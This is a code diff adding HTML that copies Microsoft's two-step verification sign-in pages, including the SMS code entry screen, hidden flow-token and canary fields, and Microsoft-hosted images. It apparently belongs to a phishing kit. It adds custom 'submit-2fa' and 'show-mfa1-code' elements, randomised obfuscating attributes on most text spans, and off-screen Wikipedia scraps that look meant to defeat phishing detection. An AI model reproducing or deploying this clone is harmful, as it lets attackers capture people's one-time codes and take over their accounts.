+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
+                        </div>
+                        <div class="table-cell text-left content click-to-enter" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                            <div class="holder" data-bind="text: display">
+								Text <span class="a10c8a3d dea38129b d57d90 a313ae4a dc9f0 d90c19 fc76db add-text c1f6583" data-a1ed="b5e9ba6" data-a3853="ec2" data-a9e8d="b4f7" data-bf645="c2a2cd" data-f0fd460="d049d15" high="e5d9a19c383f44b" integritykind="d1a5ee0310a" low="d6546cdb864" method="f8f693b0bf" muted="e5d1e71f9ccf"></span>
+							</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.isProofVisible(type) -->
+            <div class="row tile" role="listitem">
+                <div class="table" data-bind="
+                    attr: { 'data-value': value },
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    ariaDescribedBy: $data === $parent.focusedProof() ? 'idDiv_SAOTCS_Title' : null,
+                    click: $parent.proof_onClick,
+                    pressEnter: $parent.proof_onClick,
+                    hasFocus: $data === $parent.focusedProof()" data-value="TwoWayVoiceMobile" role="button" tabindex="0">
+                    <div class="table-row">
+                        <div class="table-cell tile-img">
+                            <div data-bind="component: { name: 'proof-image-control', params: { type: type } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_3fb9c7e87c04ff8f56dd61ef8b748c02.png" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_call_fe87496cc7a44412f7893a72099c120a.svg"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
+                        </div>
+                        <div class="table-cell text-left content click-to-enter" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                            <div class="holder" data-bind="text: display">
+								Text <span class="adce9 c6b25a9 add-text c90546e c73ec9" data-b316f="ea5" data-c36d49="c50bf8" data-dbf6="f75e8" data-e9b="f2d43" data-eb8d6="da85" data-f767f="d5791f" data-f9e5a12="a2cafff" method="f3ef00b788800" muted="c9a036612e8" open="a1fd0cf0f2" optimum="ef052ec8da78e7" ping="d6eab82e5291586"></span>
+							</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- /ko -->
+        <!-- /ko -->
+    </div>
+</div>
+
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+    <div class="row">
+        <!-- ko if: showHaveCodeSection || showMoreProofsLink() || lostProof || svr.urlMoreInfo || svr.fShowAuthMethodsUpdateLink -->
+        <div class="col-md-24">
+            <div class="text-13">
+                <!-- ko if: showHaveCodeSection --><!-- /ko -->
+                <!-- ko if: showMoreProofsLink --><!-- /ko -->
+                <!-- ko if: lostProof && !showMoreProofsLink() --><!-- /ko -->
+                <!-- ko if: svr.urlMoreInfo -->
+                <div class="form-group">
+                    <a aria-label="More information about two step verification" data-bind="
+                        text: str['CT_STR_More_Info'],
+                        href: svr.urlMoreInfo,
+                        ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" id="moreInfoUrl" target="_blank"><p class="c9ceca7b b243f4 d8be40 fef5db5 e1f170d0 c73fa850b" data-c07a2b="beb" data-c9ae="c71db3c" data-da5a="cddae" id="f18744a15" open="f043146c5d" optimum="bef1a7009b9f" ping="a65f6c8a0a3ab5" sandbox="b348542cec3" scope="e661ed31051f" style="display: inline;"></p></a>
+                </div>
+                <!-- /ko -->
+                <!-- ko if: svr.fShowAuthMethodsUpdateLink -->
+                <div class="text-13 form-group">
+                    <span class="d0e78d5 c338c6 fd7a1 f6969265f ca27f8 d7d559f" data-b10aa9a="d6f1" data-bind="text: str['CT_SAOTCS_STR_Update_Auth_Methods_Link']" data-ceac15="d1e1eb4" data-d0863b="d7f" low="fd73e842e53" method="fd0b38e1f8ace" muted="b2c36c60061217" open="a1be45d9f121" optimum="e68f388ae4"><p style="position: absolute; opacity: 0;"><i></i> is a genus of  in the family , containing the following species:<sup class="reference" id="cite_ref-1"></sup>
+</p><span class="bc5d40 dc4d0 dca6a99db c1afc" data-a09cdc9="b63f393" data-b679a3="a5c01f" data-d29e3="b21f8" data-d7c="ff4b" data-ef3c348="b3ddd" id="c6d0" muted="a32368f8c6623" open="d619c58e55" optimum="c2124ee60c2" ping="ee48a2c95c1a7de" scope="bb3cf1907d757"></span></span><span class="vector-dropdown-label-text" style="position: absolute; opacity: 0;">Personal tools</span>
+                </div>
+                <!-- /ko -->
+            </div>
+        </div>
+        <!-- /ko -->
+    </div>
+</div>
+
+<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+        <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: true,
+                secondaryButtonId: 'idBtn_SAOTCS_Cancel',
+                secondaryButtonText: secondaryButtonValue(),
+                isPrimaryButtonVisible: false,
+                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+
+    <!-- ko if: isSecondaryButtonVisible -->
+    <div class="inline-block">
+        <input class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
+            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
+            externalCss: {
+                'button': true,
+                'secondary': true },
+            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
+            ariaDescribedBy: secondaryButtonDescribedBy,
+            hasFocus: focusOnSecondaryButton,
+            click: secondaryButton_onClick,
+            enable: isSecondaryButtonEnabled" id="idBtn_SAOTCS_Cancel" type="button" value="Cancel"/>
+    </div>
+    <!-- /ko -->
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="win-button button_primary button ext-button primary ext-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSIButton9" style="display: none;" type="submit" value="Next"/>
+    </div>
+</div></div>
+    </div>
+</div>
+<!-- /ko -->
+
+<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+	<div class="input-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'otc-confirm-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        username: sharedData.username,
+                        focusDefaultField: true,
+                        supportsBack: true,
+                        isInitialState: isInitialState,
+                        sentProof: sharedData.sentProof,
+                        otcProofs: sharedData.otcProofs,
+                        isGeneralVerify: sharedData.isGeneralVerify,
+                        proofConfirmation: sharedData.proofConfirmation,
+                        showCancelButton: sharedData.showCancelButton,
+                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
+                        currentPollStartTime: sharedData.currentPollStartTime,
+                        currentPollEndTime: sharedData.currentPollEndTime,
+                        sessionIdentifier: sharedData.sessionIdentifier,
+                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
+                        hasTotpV2Only: sharedData.hasTotpV2Only,
+                        hasTotpV1Only: sharedData.hasTotpV1Only,
+                        flowToken: sharedData.flowToken },
+                    event: {
+                        cancel: view_onCancel,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
+                        submitReady: $tfaPage.view_onSubmitReady,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        setBackButtonState: view_onSetIdentityBackButtonState } }" data-showidentitybanner="true" data-viewid="1"><!--  -->
+
+<input data-bind="value: postType" name="type" type="hidden" value="18"/>
+<input data-bind="value: isGeneralVerify" name="GeneralVerify" type="hidden" value="false"/>
+<input data-bind="value: svr.sCtx" name="request" type="hidden" value="rQQIARAAhVM9bONkGI6TNqRRC6X86NgqUSR0wsnnf7sS0uWvdtLYJqnT_DBEn_3Zjv_TxInrbDCxUTGAdAPDDQyVWJAQqBNiQXQ6ia3chBgQEgiddLqTWEhhPjG8r96_Z3j1PE-xwJYIskSUwN0cWQKHBzTHMjTN6DhFGixOCzrAecpkcQIJ1HpFcqwBZ3vF3b9_fT-59_GX6jc_fPJW9befPrvE9idxPJ0flstJkpQiy3IMs2REQdmHIXJCe0l-i2EPMex-dtMM8d7JZXbOUhwvMDwBWMDzNMUxbEkOFG-knfqq2IkVrevJDgCyOyTamncua8N4pLUcVUP-qG4TyjrkfieVXY8cunas9HvM6ASA4ap33u43aPl2Vu-s7xRnVO9Ohm4F3GRfUiuLeELepmjmrMzH2S0rmgXjaTSP7-c-zY6PeFnhJxrV4nvzTq2qtqco8uWEdUVHTyWOC1i8ZQJf9FKfEKWl0G3CY4U_o_XQOCIaEylESxSKy2WKFmcrRdLRrC4RpGgREtmFvqWJLGh7tXpQbR1xCm07BGuoMX86WCiwBo5P5ZbVTtKOqkxMRE2WaYPqjBr2yQAyTaRLgqoDtVkbME6L9Soc77ktIKQwkNe8TBvR0jakQYfy4sF5v9e2OabXlc14PmLxhpa4faOC0xUktVaGmSTndaY68YecHjBC4EmSJg_TXj_VEygiVqx17JrFLJIzFnG1Recy98Zz6F2SX-Xy6yKIwqvcAckKlm6aBG6ZAOI0IAgc6mitIQBp1tChSTHoOsdFUzN00P50FlmObz5POUuyrP7bSVFgliq-_0vuABpGtAjje1MfpmvekAUDx08DEzkG9G9RJbh4uIH9vvF6Ib-7fQfbz7z9KsgdFgrF3cydzH7m2Qb2YHOtX-HJzgdP33ysfH198ePV3UHmerNcoWtTu-0GiHf65eYUdh0oUIT7XnmVHvfnrlA7SquRuuCU0fBdcEhc5LGLfP46_3KzPlYa2olWUeqVbp0cg7_y2Y9ewK62_tcRH27vFDJ7W1ur175451H1RrrZfqVYXDhjP1o_Y873_nPKdzuZZy_--eDzR9__fPGH9A81"/>
+<input data-bind="value: currentPollStartTime" name="mfaLastPollStart" type="hidden" value="1653984269198"/>
+<input data-bind="value: currentPollEndTime" name="mfaLastPollEnd" type="hidden" value="1653984271034"/>
+
+<input data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: proofData" name="mfaAuthMethod" type="hidden" value="OneWaySMS"/>
+
+<!-- ko if: svr.canary -->
+<input data-bind="value: svr.canary" name="canary" type="hidden" value="A4CpgLjmd8iW/IpaRia931jP/zyKWsj9CFyBoOu7NZY=1:1"/>
+<!-- /ko -->
+<!-- ko if: proofConfirmation --><!-- /ko -->
+
+<div aria-level="1" class="row text-title" data-bind="text: twoWayPollingNeeded ? str['CT_SAOTCAS_STR_Title'] : str['CT_SAOTCS_STR_Title']" id="idDiv_SAOTCC_Title" role="heading">Enter code</div>
+<div class="row text-body">
+    <div data-bind="component: { name: 'proof-image-control', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
+    <div class="text-block-body overflow-hidden" data-bind="text: description" id="idDiv_SAOTCC_Description">We texted your phone <span class="d09062c e71b91 c4111e14 c713c48a e5c61660 add-text a6459b0e7 f19f6a4b eaa36eadc" data-a676b2="f20" data-ade8c="f10bb7d" data-b14ee51="b07" data-b57a4="d8b1b" data-b99="e251a" data-d74="ddb6" data-fcff38e="b321" optimum="b8a3b01aa5" ping="fa6bf9e02d6c7" sandbox="bb0c91a916863b" scope="edc9e53f9e6" span="aab74d164f7c1a"><span class="b61ff ca402cfe cca404a23 c01115d0 b157705 e152a7 a149be4 e6316" data-bb0="da4b" data-bff="ad7527a" data-c25d8="e02" data-d7b6bd="b89ed" data-e6a8e6f="ccb8e70" high="d87207f003e3" id="c4b63" integritykind="d496164ce6b" low="f3c83a0cfe377" method="cef0dbff411" muted="d0dfdd523c6"></span><span class="reference-accessdate" style="position: absolute; display: block; width: 0; height: 0; overflow: hidden;">, retrieved <span class="nowrap">8 August</span> 2015</span></span>. Please enter the code to sign in.</div>
+</div>
+
+<div class="text-block-body">
+    <div class="form-group" id="idDiv_SAOTCC_OTCRow">
+        <div aria-live="assertive" role="alert">
+            <!-- ko if: error --><!-- /ko -->
+			<div class="row code-error">
+                <div class="sms-error alert alert-error first" id="idDiv_SAOTCC_ErrorMsg_OTC" style="display:none;">
+                    <span class="c0840932 e45e39f8b c0bd66fb d3974e9f7 eee130 error-type" data-b336ff8="b6b6b68" data-bd86fe8="a075704" data-bind="html: error" data-da3ff="ac1d97f" data-fa73="e068" id="idSpan_SAOTCC_Error_OTC" optimum="a746e75809e230e" ping="ab6c7890d51947e" sandbox="bb26fc59d43" scope="b507081c3eef" span="a6b7cd5854b"><span class="a4bbd d41b6 c1f393a f66f32 ed54e340d ed1de1652" data-a0c0d="f1a" data-bd8310="c45b8a" data-c299="f49577d" data-dd4="da2ad" data-f0d56f="a8671" id="ff3eb13d" integritykind="b8e4c6e9248118" low="ec4455c91cc5db5" method="a5016c5037d97be" muted="a1d712060e6cf0" open="a0f50080039539d"></span></span>
+                    <!-- ko if: svr.fShowViewDetailsLink -->
+                    <a aria-label="View debugging details for this error" class="no-wrap" data-bind="
+                        text: str['CT_STR_Error_ViewDetails'],
+                        clickExpr: onShowDebugDetails(debugDetails, true),
+                        ariaLabel: str['CT_STR_Error_ViewDetailsAriaLabel']" href="#" id="ViewDetails"><span class="e45d6 de099f6 bfc8b d6d5054e ce5049a2 c99a3eafc f98fa27" data-d37="ae9ab" data-d523="df8" data-d98f1="c72cd" data-dbb="d826" data-de518="a3e" data-f5ebc3="b75" data-fd63="e5cf" id="f4f2" optimum="f4ce8affc8a4" ping="d1590ccdb84" sandbox="aa169818a26ae" scope="eeffe541a7f338" span="e96e345be0e65a"></span></a>
+                    <!-- /ko -->
+                </div>
+            </div>
+        </div>
+        <div class="errorDiv" id="idDiv_SAOTCC_Success_OTC" style="display: none;">
+            <span class="e4bf0a4f fe251 cc0c5fb95 success f3ac30ea5" data-b73bdeb="aea" data-b8510="a878ea" data-d83de5="fc796" data-fc0ac="b5a" id="idSpan_SAOTCC_Success_OTC" open="d0d330ac4a652" optimum="c878b614d635" ping="e378e8a923e" sandbox="f83649c3a5" scope="eae23fdc1890dc"></span>
+        </div>
+        <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
+        <div class="textbox form-group" id="idDiv_SAOTCC_OTC">
+            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                publicMethods: otcInputTextbox.placeholderTextboxMethods,
+                params: {
+                    serverData: svr,
+                    hintText: str['CT_SAOTCC_STR_OTC_TBHint'] },
+                event: {
+                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+
+                <input aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" aria-labelledby="idDiv_SAOTCC_Title" aria-required="true" autocomplete="off" class="form-control" data-bind="
+                    attr: {
+                        'maxlength': otcLength,
+                        'aria-labelledby': 'idDiv_SAOTCC_Title',
+                        'aria-describedby': 'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC' },
+                    css: { 'has-error': error },
+                    textInput: otcInputTextbox.value,
+                    ariaLabel: str['CT_SAOTCC_STR_OTC_TBHint'],
+                    hasFocusEx: otcInputTextbox.focused,
+                    placeholder: $placeholderText" id="idTxtBx_SAOTCC_OTC" maxlength="6" name="otc" placeholder="Code" type="tel"/>
+            <!-- /ko -->
+<!-- /ko -->
+<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
+        </div>
+
+        <!-- ko if: twoFactorAuthPinEnabled --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+</div>
+<div class="text-block-body text-body" data-bind="visible: showSendNotification" style="display: none;">
+    <a data-bind="html: str['CT_SAOTCC_STR_SendNotification'], click: switchToSessionApproval_onClick" href="#" id="idA_SAOTCC_SendNotification"><span style="position: absolute; left: -12101px;">2 languages</span><span class="a4a0d5f e274c cea8e6bab d0cd0 e55e62" data-a032ea="c6a57e" data-a1b="a0cb" data-b21f301="ed4eb1a" data-da08="bc2" data-e3d="d8a2cc" data-f4378="e8d391d" headers="ac777d0739296c" high="df69141b29" id="e770ff818f6973d" integritykind="fc1560fc2b47" low="d5130bbc612" method="d2748c2b6e2f528"></span></a>
+</div>
+
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }">
+    <div class="row">
+        <div class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()" id="idDiv_SAOTCC_TD_Section" style="display: none;">
+            <div class="col-md-24 form-group no-margin-top checkbox" id="idDiv_SAOTCC_TD">
+                <label id="idLbl_SAOTCC_TD_Cb">
+                    <input aria-label="Don't ask again for undefined days" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.sTrustedDeviceCheckboxName }" id="idChkBx_SAOTCC_TD" name="rememberMFA" type="checkbox" value="true"/>
+                    <span class="eb3431079 f0a97 ff04f660f d2a0421 edda9" data-a4b="cd0337a" data-bind="text: str['CT_SAOTCC_STR_AddTD']" data-cdd="cf3d" data-d50="f4e" data-d80ad88="e6aca" data-deb313="c85ad" data-defe="fc3" data-f4c="dafe" integritykind="f73fd327a8871c" low="f806c58c384" method="fe162190474de6" muted="b92f0cd61404" open="d3fd716f5daaf4c"><span class="d8a3b298 b5db04d9 f14aad b86943d d38c07 acef0717d" data-a173b65="d43" data-ab8215a="c212d96" data-c133="fe8" data-d6334="b124" data-eccfa27="f962214" id="bf20c3e693e" integritykind="dd2076bca7" low="b54e0325c6bd" method="d409cacada26b" muted="c29bfc0a12" open="bcf977e8827f26"></span></span>
+                </label>
+            </div>
+        </div>
+
+        <!-- ko if: isInitialState || svr.urlMoreInfo -->
+        <div class="col-md-24">
+            <div class="text-13">
+                <!-- ko if: isInitialState && showSwitchProofsLink -->
+                <div class="form-group" data-bind="
+                        htmlWithBindings: str['CT_SAOTCC_STR_Toggle'],
+                        childBindings: { 'signInAnotherWay': { click: switchToOtcRequest_onClick } }" id="idDiv_SAOTCS_HavingTrouble">Having trouble? <a href="#" id="signInAnotherWay"><span class="a13a8f accb41224 dce75c d9750889a eeb622" data-a01a0f5="be42ca5" data-aed91d="b56b" data-b8e6="fca12" data-bd466c2="ab434" data-c4e5="e57e" data-dbaf206="b1287e9" data-e45b="c2850" id="a900d" open="c9dcfec033f14" optimum="e7ce2e7d5e483" ping="d479660d248" sandbox="b9b74a182f09b0" scope="c4a7fd084ad141"></span></a></div>
+                <!-- /ko -->
+                <!-- ko if: svr.urlMoreInfo -->
+                <div class="form-group" data-bind="css: { 'form-group': !twoWayPollingNeeded }">
+                    <a aria-label="More information about two step verification" data-bind="
+                            text: str['CT_STR_More_Info'],
+                            href: svr.urlMoreInfo,
+                            ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" id="moreInfoUrl" target="_blank"><p class="c05625 e1236 e00f86317 b657e b9f1227" data-e06="c04" data-e3af48a="a13b0" data-f415a2e="ae7dbec" headers="a55cd3c3862613" high="f716c69910644" id="ed90b2d0ac09" integritykind="c204ef215c" low="f27745bcce72ed" method="bd92b271c14" style="display: inline;"></p></a>
+                </div>
+                <!-- /ko -->
+            </div>
+        </div>
+        <!-- /ko -->
+    </div>
+</div>
+
+<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+        <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: true,
+                primaryButtonId: 'idSubmit_SAOTCC_Continue',
+                primaryButtonText: str['CT_SAOTCC_STR_Continue'],
+                secondaryButtonId: 'idBtn_Back',
+                secondaryButtonText: str['CT_SAOTCC_STR_Cancel'],
+                isSecondaryButtonVisible: !showSwitchProofsLink,
+                isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
+                secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? 'idDiv_SAOTCC_Description' : null },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+
+    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+    <div class="inline-block" data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="submit-2fa btn btn-block btn-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSubmit_SAOTCC_Continue" type="submit" value="Verify"/>
+    </div>
+</div></div>
+    </div>
+</div>
+
+<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+	
+	
+	
+	
+	<div class="show-mfa1-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'otc-confirm-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        username: sharedData.username,
+                        focusDefaultField: true,
+                        supportsBack: true,
+                        isInitialState: isInitialState,
+                        sentProof: sharedData.sentProof,
+                        otcProofs: sharedData.otcProofs,
+                        isGeneralVerify: sharedData.isGeneralVerify,
+                        proofConfirmation: sharedData.proofConfirmation,
+                        showCancelButton: sharedData.showCancelButton,
+                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
+                        currentPollStartTime: sharedData.currentPollStartTime,
+                        currentPollEndTime: sharedData.currentPollEndTime,
+                        sessionIdentifier: sharedData.sessionIdentifier,
+                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
+                        hasTotpV2Only: sharedData.hasTotpV2Only,
+                        hasTotpV1Only: sharedData.hasTotpV1Only,
+                        flowToken: sharedData.flowToken },
+                    event: {
+                        cancel: view_onCancel,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
+                        submitReady: $tfaPage.view_onSubmitReady,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        setBackButtonState: view_onSetIdentityBackButtonState } }" data-showidentitybanner="true" data-viewid="1"><!--  -->
+
+<input data-bind="value: postType" name="type" type="hidden" value="19"/>
+<input data-bind="value: isGeneralVerify" name="GeneralVerify" type="hidden" value="false"/>
